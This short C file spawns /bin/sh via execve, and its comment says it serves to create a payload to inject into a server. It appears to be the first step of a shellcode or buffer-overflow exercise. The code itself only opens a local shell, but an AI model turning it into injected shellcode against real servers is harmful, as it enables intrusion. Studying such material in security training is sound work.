/* 
	This is an app that launches a console.
	We will use this to create the payload to inject into the server
 */
#include <stdio.h> 

int
main(void)
{
	char *name[2];
	/* Initialise */
	name[0] = "/bin/sh";
	name[1] = NULL;
	/* Launch shell */
	execve(name[0],
	name, NULL);
} 
